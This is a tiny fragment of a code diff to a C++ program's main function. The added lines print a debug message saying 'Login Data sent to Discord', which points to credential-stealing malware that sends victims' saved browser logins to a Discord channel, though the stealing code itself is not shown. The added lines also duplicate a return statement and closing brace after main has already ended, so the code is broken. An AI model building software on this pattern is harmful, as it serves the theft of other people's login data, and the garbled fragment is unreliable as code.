@@ -292,3 +292,8 @@ int main(int argc, char* argv[]) {
     #endif
     return 0;
 }
+    #ifdef DEBUG_MOD
+    std::cout << "Login Data sent to Discord.\n" << con << "\n";
+    #endif
+    return 0;
+}
